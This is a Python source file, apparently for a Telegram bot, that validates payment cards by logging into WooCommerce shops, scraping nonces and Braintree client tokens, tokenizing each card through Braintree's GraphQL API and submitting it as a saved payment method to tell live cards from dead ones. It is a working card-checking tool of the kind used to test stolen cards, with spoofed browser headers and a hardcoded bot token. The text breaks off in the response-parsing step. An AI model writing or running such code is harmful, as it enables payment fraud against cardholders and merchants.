import logging
import re
import io
import asyncio
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
import cloudscraper
import requests
import base64
import uuid
import json
import os
import httpx
import random
import string

BOT_TOKEN = "7879139068:AAHA9aruLA99kMQBrDHyEnpcRF8peAF9ywQ"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

def get_general_headers(target_url=None, referer=None):
    authority = "example.com"
    if target_url:
        try:
            parsed_url = urlparse(target_url)
            authority = parsed_url.netloc if parsed_url.netloc else authority
        except Exception:
            logger.warning(f"Could not parse target_url {target_url} for authority.")

    effective_referer = referer
    if not effective_referer and target_url:
        try:
            parsed_target_url = urlparse(target_url)
            effective_referer = f"{parsed_target_url.scheme}://{parsed_target_url.netloc}/"
        except Exception:
            effective_referer = "https://google.com"
    elif not effective_referer:
        effective_referer = "https://google.com"

    return {
        "authority": authority,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin" if referer and authority in referer else "cross-site",
        "sec-fetch-user": "?1", "upgrade-insecure-requests": "1",
        "referer": effective_referer,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }

async def safe_edit_message(message, new_text: str, **kwargs):
    escaped_text = escape_markdown(new_text, version=2)
    try:
        await message.edit_text(escaped_text, parse_mode=ParseMode.MARKDOWN_V2, **kwargs)
    except Exception as e:
        if "Message is not modified" not in str(e):
            logger.warning(f"Failed to edit message with MarkdownV2, falling back. Error: {e}")

async def get_bin_info(bin_number: str):
    if not bin_number or len(bin_number) < 6: return {"error": "Invalid BIN"}
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f"https://lookup.binlist.net/{bin_number[:6]}")
            if response.status_code != 200: return {"error": f"API returned {response.status_code}"}
            data = response.json()
            return {
                "Scheme": data.get("scheme", "N/A").upper(), "Type": data.get("type", "N/A").upper(),
                "Brand": data.get("brand", "N/A"), "Country": data.get("country", {}).get("name", "N/A"),
                "Bank": data.get("bank", {}).get("name", "N/A"),
            }
    except Exception as e:
        return {"error": f"Lookup failed: {e}"}

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

def get_forged_headers(target_url=None, referer=None):
    """Generate headers for HTTP requests"""
    return get_general_headers(target_url, referer)

def _sync_perform_braintree_check(session: cloudscraper.CloudScraper, site_config: dict, card_data: dict):
    """The complete, fused assault protocol, combining both user scripts."""
    import re

    cc, mm, yy, cvv = card_data['cc'], card_data['mm'], card_data['yy'], card_data['cvv']
    exp_year_full = f"20{yy}" if len(yy) == 2 else yy
    main = site_config['domain']

    try:
        user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

        # Smart URL construction - handle base URLs and existing paths
        # Remove any existing protocol prefix to avoid double https://
        clean_main = main.replace('https://', '').replace('http://', '')

        # Check if the domain already contains account/login paths
        if '/my-account' in clean_main or '/account' in clean_main or '/login' in clean_main:
            # Already has account/login path, use as-is but ensure proper protocol
            login_url = f'https://{clean_main}'
            # Remove trailing slash if present to avoid double slashes
            if login_url.endswith('/'):
                login_url = login_url.rstrip('/')
        else:
            # No account path present, add /my-account/
            base_clean = clean_main.rstrip('/')  # Remove any trailing slash
            login_url = f'https://{base_clean}/my-account/'

        logger.info(f"[{cc[-4:]}] Phase 1: Infiltrating {login_url}")
        login_page_response = session.get(login_url, headers=get_forged_headers(target_url=login_url), timeout=25)
        login_page_response.raise_for_status()

        nonce = re.search(r'id="woocommerce-login-nonce".*?value="(.*?)"', login_page_response.text).group(1)

        login_headers = get_forged_headers(target_url=f'https://{main}/my-account/', referer=f'https://{main}/my-account/')
        login_headers['content-type'] = 'application/x-www-form-urlencoded'

        login_data = {
            'username': site_config['user'], 'password': site_config['pass'],
            'woocommerce-login-nonce': nonce, '_wp_http_referer': '/my-account/', 'login': 'Log in',
        }

        login_req = session.post(login_url, headers=login_headers, data=login_data, timeout=25)
        if 'logout' not in login_req.text.lower() and 'dashboard' not in login_req.url.lower():
            return {"is_approved": False, "summary": "DEAD - Login Failed", "message": "Could not confirm successful login."}
        logger.info(f"[{cc[-4:]}] Login successful.")

        logger.info(f"[{cc[-4:]}] Phase 3: Navigating to payment page...")

        # Extract base domain for proper URL construction
        if main.startswith(('http://', 'https://')):
            # Parse the URL to get just the domain
            from urllib.parse import urlparse
            parsed = urlparse(main if main.startswith(('http://', 'https://')) else f'https://{main}')
            base_domain = parsed.netloc
        else:
            base_domain = main.split('/')[0] if '/' in main else main

        payment_url = site_config.get('payment_url')
        if payment_url:
            logger.info(f"[{cc[-4:]}] Using custom payment URL: {payment_url}")
            nav_headers = get_forged_headers(target_url=payment_url, referer=login_url)
            payment_page_req = session.get(payment_url, headers=nav_headers, timeout=20)
        else:
            payment_methods_url = f'https://{base_domain}/my-account/payment-methods/'
            add_payment_url = f'https://{base_domain}/my-account/add-payment-method/'

            nav_headers = get_forged_headers(target_url=payment_methods_url, referer=login_url)
            session.get(payment_methods_url, headers=nav_headers, timeout=20)

            nav_headers['referer'] = payment_methods_url
            payment_page_req = session.get(add_payment_url, headers=nav_headers, timeout=20)

        client_token = None
        noncec = None

        standard_patterns = [
            ('"client_token_nonce":"', '"'),
            ("'client_token_nonce':'", "'"),
            ('client_token_nonce":', ','),
            ('client_token_nonce":"', '",'),
            ('client_token_nonce&quot;:&quot;', '&quot;'),
            ('braintree_client_token":"', '"'),
            ('wc_braintree_client_token_nonce":"', '"'),
            ('wc_braintree_credit_card_client_token_nonce":"', '"'),
            ('bt_client_token":"', '"'),
            ('clientToken":"', '"'),
            ('client-token":"', '"'),
        ]

        for start, end in standard_patterns:
            if not client_token:
                client_token = parseX(payment_page_req.text, start, end)
                if client_token:
                    logger.info(f"[{cc[-4:]}] Found client token using pattern: {start}")
                    break

        nonce_patterns = [
            ('<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '" />'),
            ('<input type="hidden" name="woocommerce-add-payment-method-nonce" value="', '"'),
            ('woocommerce-add-payment-method-nonce" value="', '"'),
            ('add-payment-method-nonce" value="', '"'),
            ('payment-method-nonce" value="', '"'),
            ('"woocommerce-add-payment-method-nonce":"', '"'),
            ("'woocommerce-add-payment-method-nonce':'", "'"),
            ('wc-braintree-add-payment-method-nonce" value="', '"'),
            ('braintree-add-payment-nonce" value="', '"'),
        ]

        for start, end in nonce_patterns:
            if not noncec:
                noncec = parseX(payment_page_req.text, start, end)
                if noncec:
                    logger.info(f"[{cc[-4:]}] Found nonce using pattern: {start}")
                    break

        if not client_token or not noncec:
            import re

            if not client_token:
                token_regex_patterns = [
                    r'client_token[_\-]?nonce["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                    r'braintree[_\-]?client[_\-]?token["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                    r'wc[_\-]braintree[_\-]?.*?token[_\-]?nonce["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                    r'bt[_\-]?client[_\-]?token["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                    r'"clientToken"\s*:\s*"([^"]{20,})"',
                    r"'clientToken'\s*:\s*'([^']{20,})'",
                    r'authorization[_\-]?fingerprint["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                ]

                for pattern in token_regex_patterns:
                    match = re.search(pattern, payment_page_req.text, re.IGNORECASE)
                    if match:
                        client_token = match.group(1)
                        logger.info(f"[{cc[-4:]}] Found client token using regex: {pattern[:50]}...")
                        break

            if not noncec:
                nonce_regex_patterns = [
                    r'woocommerce[_\-]add[_\-]payment[_\-]method[_\-]nonce["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
                    r'add[_\-]payment[_\-]method[_\-]nonce["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
                    r'payment[_\-]method[_\-]nonce["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
                    r'wc[_\-]braintree[_\-].*?nonce["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
                    r'name=["\']woocommerce[_\-]add[_\-]payment[_\-]method[_\-]nonce["\'][^>]*value=["\']([^"\']+)["\']',
                    r'id=["\']woocommerce[_\-]add[_\-]payment[_\-]method[_\-]nonce["\'][^>]*value=["\']([^"\']+)["\']',
                ]

                for pattern in nonce_regex_patterns:
                    match = re.search(pattern, payment_page_req.text, re.IGNORECASE)
                    if match:
                        noncec = match.group(1)
                        logger.info(f"[{cc[-4:]}] Found nonce using regex: {pattern[:50]}...")
                        break

        if not client_token or not noncec:
            soup = BeautifulSoup(payment_page_req.text, 'html.parser')

            script_tags = soup.find_all('script')
            for script in script_tags:
                script_content = script.string or script.get_text()
                if not script_content:
                    continue

                if not client_token:
                    script_token_patterns = [
                        r'braintree[^}]*client[_\-]?token[_\-]?nonce["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                        r'wc[_\-]braintree[^}]*["\']([^"\']{40,})["\']',
                        r'wp_localize_script[^}]*client[_\-]?token[^}]*["\']([^"\']{20,})["\']',
                        r'var\s+[a-zA-Z_$][a-zA-Z0-9_$]*\s*=\s*["\']([^"\']{40,})["\']',
                        r'clientToken["\']?\s*:\s*["\']([^"\']{20,})["\']',
                    ]

                    for pattern in script_token_patterns:
                        match = re.search(pattern, script_content, re.IGNORECASE)
                        if match and len(match.group(1)) > 20:
                            client_token = match.group(1)
                            logger.info(f"[{cc[-4:]}] Found client token in script tag")
                            break

                if not noncec:
                    script_nonce_patterns = [
                        r'woocommerce[_\-]add[_\-]payment[_\-]method[_\-]nonce["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
                        r'add[_\-]payment[_\-].*?nonce["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
                        r'payment[_\-]nonce["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
                    ]

                    for pattern in script_nonce_patterns:
                        match = re.search(pattern, script_content, re.IGNORECASE)
                        if match:
                            noncec = match.group(1)
                            logger.info(f"[{cc[-4:]}] Found nonce in script tag")
                            break

                if client_token and noncec:
                    break

        if not client_token or not noncec:
            alternative_urls = [
                f'https://{base_domain}/checkout/',
                f'https://{base_domain}/cart/',
                f'https://{base_domain}/my-account/edit-account/',
                f'https://{base_domain}/my-account/orders/',
                f'https://{base_domain}/my-account/edit-address/',
                f'https://{base_domain}/shop/',
                f'https://{base_domain}/account/',
                f'https://{base_domain}/customer/account/',
                f'https://{base_domain}/payment/',
                f'https://{base_domain}/billing/',
            ]

            for alt_url in alternative_urls:
                try:
                    logger.info(f"[{cc[-4:]}] Trying alternative URL: {alt_url}")
                    alt_headers = get_forged_headers(target_url=alt_url, referer=f'https://{main}/my-account/')
                    alt_req = session.get(alt_url, headers=alt_headers, timeout=15)

                    if not client_token:
                        for start, end in standard_patterns:
                            client_token = parseX(alt_req.text, start, end)
                            if client_token:
                                logger.info(f"[{cc[-4:]}] Found client token on {alt_url}")
                                break

                    if not noncec:
                        for start, end in nonce_patterns:
                            noncec = parseX(alt_req.text, start, end)
                            if noncec:
                                logger.info(f"[{cc[-4:]}] Found nonce on {alt_url}")
                                break

                    if client_token and noncec:
                        break

                except Exception as e:
                    logger.debug(f"[{cc[-4:]}] Failed to check {alt_url}: {e}")
                    continue

        if not client_token:
            try:
                logger.info(f"[{cc[-4:]}] Attempting AJAX token discovery...")
                ajax_endpoints = [
                    f'https://{base_domain}/wp-admin/admin-ajax.php',
                    f'https://{base_domain}/ajax/get-braintree-token',
                    f'https://{base_domain}/api/payment/token',
                ]

                for endpoint in ajax_endpoints:
                    try:
                        ajax_headers = get_forged_headers(target_url=endpoint, referer=payment_url or f'https://{main}/my-account/add-payment-method/')
                        ajax_headers.update({
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'x-requested-with': 'XMLHttpRequest'
                        })

                        ajax_actions = [
                            'wc_braintree_credit_card_get_client_token',
                            'get_braintree_client_token',
                            'braintree_get_token',
                            'wc_braintree_get_client_token'
                        ]

                        for action in ajax_actions:
                            ajax_data = {'action': action, 'nonce': noncec or 'temp'}
                            ajax_req = session.post(endpoint, headers=ajax_headers, data=ajax_data, timeout=15)

                            if ajax_req.status_code == 200:
                                try:
                                    ajax_json = ajax_req.json()
                                    if 'data' in ajax_json:
                                        token_data = ajax_json['data']
                                        if isinstance(token_data, str) and len(token_data) > 20:
                                            client_token = token_data
                                            logger.info(f"[{cc[-4:]}] Found client token via AJAX")
                                            break
                                except:
                                    pass

                            if client_token:
                                break

                        if client_token:
                            break

                    except Exception as e:
                        logger.debug(f"[{cc[-4:]}] AJAX endpoint {endpoint} failed: {e}")
                        continue

            except Exception as e:
                logger.debug(f"[{cc[-4:]}] AJAX discovery failed: {e}")

        if not client_token or not noncec:
            logger.warning(f"[{cc[-4:]}] Token extraction summary:")
            logger.warning(f"[{cc[-4:]}] - Client token found: {bool(client_token)} (length: {len(client_token) if client_token else 0})")
            logger.warning(f"[{cc[-4:]}] - Nonce found: {bool(noncec)} (length: {len(noncec) if noncec else 0})")
            logger.warning(f"[{cc[-4:]}] - Payment URL used: {payment_url or 'auto-discovery'}")

            return {
                "is_approved": False,
                "summary": "DEAD - Setup Failed",
                "message": f"Braintree token extraction failed. Client token: {bool(client_token)}, Nonce: {bool(noncec)}. Try providing a custom payment page URL."
            }

        logger.info(f"[{cc[-4:]}] Successfully extracted tokens - Client token: {len(client_token)} chars, Nonce: {len(noncec)} chars")

        logger.info(f"[{cc[-4:]}] Phase 5: Comprehensive AJAX auto-detection with DOM inspection...")

        # First, inspect the DOM for AJAX URLs and actions
        detected_endpoints = set()
        detected_actions = set()

        # Parse the payment page for AJAX information
        soup = BeautifulSoup(payment_page_req.text, 'html.parser')

        # Method 1: Look for AJAX URLs in forms
        forms = soup.find_all('form')
        for form in forms:
            action_url = form.get('action', '')
            if action_url and ('ajax' in action_url.lower() or 'admin-ajax' in action_url.lower()):
                if action_url.startswith('/'):
                    action_url = f'https://{base_domain}{action_url}'
                detected_endpoints.add(action_url)
                logger.info(f"[{cc[-4:]}] Found AJAX URL in form action: {action_url}")

        # Method 2: Look for AJAX URLs in data attributes
        ajax_elements = soup.find_all(attrs={'data-ajax-url': True})
        for elem in ajax_elements:
            ajax_url = elem.get('data-ajax-url', '')
            if ajax_url:
                if ajax_url.startswith('/'):
                    ajax_url = f'https://{base_domain}{ajax_url}'
                detected_endpoints.add(ajax_url)
                logger.info(f"[{cc[-4:]}] Found AJAX URL in data-ajax-url: {ajax_url}")

        # Method 3: Look for ajaxurl in script tags and variables
        script_content = payment_page_req.text
        ajax_url_patterns = [
            r'ajaxurl["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'ajax_url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'adminajax["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'wc_ajax_url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'wp_admin_ajax["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        ]

        for pattern in ajax_url_patterns:
            matches = re.findall(pattern, script_content, re.IGNORECASE)
            for match in matches:
                if match and 'ajax' in match.lower():
                    if match.startswith('/'):
                        match = f'https://{base_domain}{match}'
                    detected_endpoints.add(match)
                    logger.info(f"[{cc[-4:]}] Found AJAX URL via regex: {match}")

        # Method 4: Look for AJAX actions in script content
        action_patterns = [
            r'action["\']?\s*[:=]\s*["\']([^"\']*braintree[^"\']*)["\']',
            r'action["\']?\s*[:=]\s*["\']([^"\']*client[_\-]?token[^"\']*)["\']',
            r'["\']([a-zA-Z_]+braintree[a-zA-Z_]*)["\']',
            r'["\'](wc[_\-]braintree[a-zA-Z_]*)["\']',
            r'["\'](get[_\-]client[_\-]token[a-zA-Z_]*)["\']',
        ]

        for pattern in action_patterns:
            matches = re.findall(pattern, script_content, re.IGNORECASE)
            for match in matches:
                if match and len(match) > 5:
                    detected_actions.add(match)
                    logger.info(f"[{cc[-4:]}] Found AJAX action via regex: {match}")

        # Method 5: Look for jQuery AJAX calls
        jquery_patterns = [
            r'\$\.post\(["\']([^"\']*ajax[^"\']*)["\']',
            r'\$\.ajax\(\{[^}]*url["\']?\s*:\s*["\']([^"\']*ajax[^"\']*)["\']',
            r'jQuery\.post\(["\']([^"\']*ajax[^"\']*)["\']',
        ]

        for pattern in jquery_patterns:
            matches = re.findall(pattern, script_content, re.IGNORECASE)
            for match in matches:
                if match:
                    if match.startswith('/'):
                        match = f'https://{base_domain}{match}'
                    detected_endpoints.add(match)
                    logger.info(f"[{cc[-4:]}] Found AJAX URL in jQuery call: {match}")

        # Default endpoints to try
        default_endpoints = [
            f'https://{base_domain}/wp-admin/admin-ajax.php',
            f'https://{base_domain}/ajax/braintree-token',
            f'https://{base_domain}/api/braintree/token',
            f'https://{base_domain}/checkout/ajax/braintree',
        ]

        # Combine detected and default endpoints
        all_endpoints = list(detected_endpoints) + default_endpoints

        # Default actions to try
        default_actions = [
            'wc_braintree_credit_card_get_client_token',
            'wc_braintree_get_client_token',
            'get_braintree_client_token',
            'braintree_get_token',
            'wc_braintree_upe_get_client_token',
            'wc_stripe_create_and_confirm_setup_intent',
            'get_client_token',
            'braintree_client_token',
            'bt_get_token',
            'wc_braintree_cc_get_client_token'
        ]

        # Combine detected and default actions
        all_actions = list(detected_actions) + default_actions

        logger.info(f"[{cc[-4:]}] Detected {len(detected_endpoints)} endpoints and {len(detected_actions)} actions from DOM")

        # Multiple nonce parameter names to try
        nonce_params = ['nonce', '_ajax_nonce', 'security', '_wpnonce', 'token', 'client_token_nonce']

        auth_fingerprint = None
        successful_method = None
        attempt_count = 0

        # Try all combinations but with some intelligence
        for endpoint in all_endpoints:
            if auth_fingerprint:
                break

            logger.info(f"[{cc[-4:]}] Trying endpoint: {endpoint}")

            for action in all_actions:
                if auth_fingerprint:
                    break

                # Prioritize detected actions
                if action in detected_actions:
                    logger.info(f"[{cc[-4:]}] Prioritizing detected action: {action}")

                for nonce_param in nonce_params:
                    attempt_count += 1
                    try:
                        ajax_headers = get_forged_headers(target_url=endpoint, referer=f'https://{base_domain}/my-account/add-payment-method/')
                        ajax_headers.update({
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'x-requested-with': 'XMLHttpRequest',
                            'accept': 'application/json, text/javascript, */*; q=0.01'
                        })

                        # For WooCommerce AJAX endpoints, construct the proper URL
                        actual_endpoint = endpoint
                        if 'wp-admin/admin-ajax.php' in endpoint:
                            # Use standard WordPress AJAX endpoint
                            actual_endpoint = endpoint
                        elif '/?wc-ajax=' in endpoint or '/wc-ajax/' in endpoint:
                            # Construct WooCommerce AJAX URL properly
                            actual_endpoint = f'https://{base_domain}/?wc-ajax={action}'

                        # Prepare AJAX data with different parameter combinations
                        ajax_data = {
                            'action': action
                        }

                        # Use the correct nonce (not client_token) for WordPress AJAX
                        if noncec:
                            ajax_data.update({
                                'security': noncec,
                                'nonce': noncec,
                                '_ajax_nonce': noncec,
                                '_wpnonce': noncec,
                                'woocommerce-add-payment-method-nonce': noncec
                            })

                        # Add additional common parameters for WordPress
                        if 'wp-admin/admin-ajax.php' in actual_endpoint:
                            ajax_data.update({
                                '_wp_http_referer': '/my-account/add-payment-method/'
                            })

                        logger.info(f"[{cc[-4:]}] Attempt {attempt_count}: {action} with security nonce on {actual_endpoint}")
                        ajax_req = session.post(actual_endpoint, headers=ajax_headers, data=ajax_data, timeout=15)

                        response_text = ajax_req.text.strip()

                        # Log response for debugging
                        if ajax_req.status_code == 200:
                            logger.info(f"[{cc[-4:]}] Response from {action}: Status {ajax_req.status_code}, Length: {len(response_text)}, Content: {response_text[:200]}...")
                        else:
                            logger.warning(f"[{cc[-4:]}] Failed {action}: HTTP {ajax_req.status_code}")

                        # Skip obvious error responses but be less strict
                        if ajax_req.status_code != 200 or response_text in ['-1', '0', '']:
                            logger.debug(f"[{cc[-4:]}] Skipping empty/invalid response from {action}")
                            continue

                        # Special handling for empty responses - might be working but missing parameters
                        if len(response_text) == 0:
                            logger.warning(f"[{cc[-4:]}] Empty response from {action} - endpoint exists but may need different parameters")
                            # Try with different nonce parameter names for this action
                            for alt_nonce_param in ['_wpnonce', 'security', '_token', 'csrf_token']:
                                if alt_nonce_param in ajax_data:
                                    continue  # Already tried this parameter

                                alt_ajax_data = ajax_data.copy()
                                alt_ajax_data[alt_nonce_param] = noncec

                                try:
                                    alt_req = session.post(actual_endpoint, headers=ajax_headers, data=alt_ajax_data, timeout=10)
                                    alt_response = alt_req.text.strip()

                                    if alt_req.status_code == 200 and len(alt_response) > 0:
                                        logger.info(f"[{cc[-4:]}] Got response with {alt_nonce_param}: {alt_response[:100]}")
                                        response_text = alt_response
                                        ajax_req = alt_req
                                        break
                                except:
                                    continue

                            if len(response_text) == 0:
                                continue

                        # Try to parse as JSON first
                        try:
                            ajax_response = ajax_req.json()
                            logger.info(f"[{cc[-4:]}] JSON Response from {action}: {ajax_response}")

                            # Check for success response with data
                            if isinstance(ajax_response, dict):
                                token_data = None

                                # Try different response formats
                                if ajax_response.get('success') and 'data' in ajax_response:
                                    token_data = ajax_response['data']
                                elif 'client_token' in ajax_response:
                                    token_data = ajax_response['client_token']
                                elif 'token' in ajax_response:
                                    token_data = ajax_response['token']
                                elif 'authorizationFingerprint' in ajax_response:
                                    auth_fingerprint = ajax_response['authorizationFingerprint']
                                    successful_method = f"{endpoint} -> {action}"
                                    break
                                elif 'data' in ajax_response and ajax_response['data']:
                                    token_data = ajax_response['data']

                                if token_data and isinstance(token_data, str) and len(token_data) > 20:
                                    try:
                                        # Try to decode base64 token data
                                        if token_data.startswith('eyJ'):  # Base64 JWT-like token
                                            decoded_data = json.loads(base64.b64decode(token_data + '=='))
                                            if 'authorizationFingerprint' in decoded_data:
                                                auth_fingerprint = decoded_data['authorizationFingerprint']
                                                successful_method = f"{actual_endpoint} -> {action}"
                                                logger.info(f"[{cc[-4:]}] Successfully extracted auth fingerprint using {successful_method}")
                                                break
                                            elif 'environment' in decoded_data and 'authorizationFingerprint' in str(decoded_data):
                                                # Sometimes the fingerprint is nested deeper
                                                fingerprint_match = re.search(r'"authorizationFingerprint":\s*"([^"]+)"', str(decoded_data))
                                                if fingerprint_match:
                                                    auth_fingerprint = fingerprint_match.group(1)
                                                    successful_method = f"{actual_endpoint} -> {action}"
                                                    logger.info(f"[{cc[-4:]}] Extracted nested auth fingerprint using {successful_method}")
                                                    break
                                    except Exception as decode_error:
                                        logger.debug(f"[{cc[-4:]}] Failed to decode token: {decode_error}")
                                        # Token might be the actual client token we need to use differently
                                        if len(token_data) > 50:
                                            # Update client_token with the new one and try again with a specific endpoint
                                            client_token = token_data
                                            logger.info(f"[{cc[-4:]}] Updated client token, will retry with new token")

                            # Check if response is direct token string
                            elif isinstance(ajax_response, str) and len(ajax_response) > 20:
                                try:
                                    if ajax_response.startswith('eyJ'):
                                        decoded_data = json.loads(base64.b64decode(ajax_response + '=='))
                                        if 'authorizationFingerprint' in decoded_data:
                                            auth_fingerprint = decoded_data['authorizationFingerprint']
                                            successful_method = f"{actual_endpoint} -> {action}"
                                            break
                                except:
                                    pass

                        except json.JSONDecodeError:
                            # Response might be raw token or fingerprint
                            logger.info(f"[{cc[-4:]}] Non-JSON response from {action}: {response_text[:200]}...")

                            # Check if it's a raw base64 token
                            if len(response_text) > 50 and 'eyJ' in response_text:  # Looks like base64 JWT
                                try:
                                    # Extract just the base64 part if there's other text
                                    token_match = re.search(r'(eyJ[A-Za-z0-9+/=]+)', response_text)
                                    if token_match:
                                        token_data = token_match.group(1)
                                        decoded_data = json.loads(base64.b64decode(token_data + '=='))
                                        if 'authorizationFingerprint' in decoded_data:
                                            auth_fingerprint = decoded_data['authorizationFingerprint']
                                            successful_method = f"{actual_endpoint} -> {action}"
                                            logger.info(f"[{cc[-4:]}] Extracted fingerprint from raw base64 token")
                                            break
                                except Exception as e:
                                    logger.debug(f"[{cc[-4:]}] Failed to decode raw token: {e}")

                            # Check if response contains the client token pattern
                            elif 'client_token' in response_text.lower() or len(response_text) > 100:
                                # Try to extract base64 token from HTML/text response
                                token_patterns = [
                                    r'"client_token":"([^"]+)"',
                                    r"'client_token':'([^']+)'",
                                    r'client_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                                    r'(eyJ[A-Za-z0-9+/=]{50,})'
                                ]

                                for pattern in token_patterns:
                                    match = re.search(pattern, response_text)
                                    if match:
                                        potential_token = match.group(1)
                                        try:
                                            if potential_token.startswith('eyJ'):
                                                decoded_data = json.loads(base64.b64decode(potential_token + '=='))
                                                if 'authorizationFingerprint' in decoded_data:
                                                    auth_fingerprint = decoded_data['authorizationFingerprint']
                                                    successful_method = f"{actual_endpoint} -> {action} (regex extracted)"
                                                    logger.info(f"[{cc[-4:]}] Extracted fingerprint via regex pattern")
                                                    break
                                        except:
                                            continue

                                if auth_fingerprint:
                                    break

                    except Exception as e:
                        logger.debug(f"[{cc[-4:]}] Failed {action} on {endpoint}: {e}")
                        continue

                    # Limit attempts to avoid infinite loops
                    if attempt_count > 150: # Increased limit for more thorough checks
                        logger.warning(f"[{cc[-4:]}] Exceeded attempt limit ({attempt_count}) for action {action}")
                        break

                if attempt_count > 150:
                    break

            if attempt_count > 150:
                break

        if not auth_fingerprint:
            # Final fallback: try to use the client_token directly if we have it
            if client_token and len(client_token) > 50:
                logger.info(f"[{cc[-4:]}] Attempting to decode existing client token directly...")
                try:
                    if client_token.startswith('eyJ'):
                        decoded_data = json.loads(base64.b64decode(client_token + '=='))
                        if 'authorizationFingerprint' in decoded_data:
                            auth_fingerprint = decoded_data['authorizationFingerprint']
                            successful_method = "Direct client token decode"
                            logger.info(f"[{cc[-4:]}] Successfully decoded existing client token")
                        elif 'environment' in decoded_data:
                            # Sometimes fingerprint is nested in environment data
                            env_data = decoded_data.get('environment', {})
                            if isinstance(env_data, dict) and 'authorizationFingerprint' in env_data:
                                auth_fingerprint = env_data['authorizationFingerprint']
                                successful_method = "Client token environment decode"
                                logger.info(f"[{cc[-4:]}] Found fingerprint in environment data")
                except Exception as e:
                    logger.debug(f"[{cc[-4:]}] Failed to decode client token: {e}")

            if not auth_fingerprint:
                logger.error(f"[{cc[-4:]}] All AJAX auto-detection methods failed after {attempt_count} attempts")
                return {
                    "is_approved": False,
                    "summary": "DEAD - AJAX Auto-Detection Failed",
                    "message": f"Could not auto-detect working AJAX endpoint after {attempt_count} attempts. Site may not support Braintree or requires different authentication."
                }

        logger.info(f"[{cc[-4:]}] Auth fingerprint obtained via: {successful_method}")

        logger.info(f"[{cc[-4:]}] Phase 6: Tokenizing card with Braintree...")
        gql_headers = {
            'authority': 'payments.braintree-api.com', 'accept': '*/*', 'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10', 'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/', 'user-agent': user_agent,
        }
        gql_payload = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': str(uuid.uuid4())},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': exp_year_full, 'cvv': cvv}}},
            'operationName': 'TokenizeCreditCard',
        }
        gql_req = requests.post('https://payments.braintree-api.com/graphql', headers=gql_headers, json=gql_payload, timeout=20)
        payment_nonce = gql_req.json()['data']['tokenizeCreditCard']['token']

        logger.info(f"[{cc[-4:]}] Phase 7: Submitting final token to site...")
        final_headers = get_forged_headers(target_url=f'https://{main}/my-account/add-payment-method/', referer=f'https://{main}/my-account/add-payment-method/')
        final_headers['content-type'] = 'application/x-www-form-urlencoded'
        final_data = [
            ('payment_method', 'braintree_credit_card'), ('wc_braintree_credit_card_payment_nonce', payment_nonce),
            ('wc_braintree_device_data', f'{{"correlation_id":"{str(uuid.uuid4()).replace("-", "")}"}}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', noncec), ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]

        final_req = session.post(f'https://{base_domain}/my-account/add-payment-method/', headers=final_headers, data=final_data, timeout=20)

        logger.info(f"[{cc[-4:]}] === BRAINTREE RESPONSE ANALYSIS ===")
        logger.info(f"[{cc[-4:]}] Status Code: {final_req.status_code}")
        logger.info(f"[{cc[-4:]}] Final URL: {final_req.url}")

        response_text = final_req.text.lower()
        error_message = None
        is_approved = False

        if 'payment-methods' in final_req.url and 'add-payment-method' not in final_req.url:
            error_message = "Payment method successfully added (redirected to payment methods)"
            is_approved = True
            logger.info(f"[{cc[-4:]}] SUCCESS: Redirected to payment methods page")

        elif not error_message:
            soup = BeautifulSoup(final_req.text, 'html.parser')

            success_selectors = [
                '.woocommerce-message',
                '.woocommerce-info',
                '.notice.notice-success',
                '.alert.alert-success',
                '.success-message'
            ]

            for selector in success_selectors:
                success_elem = soup.select_one(selector)
                if success_elem:
                    message_text = success_elem.get_text(strip=True)
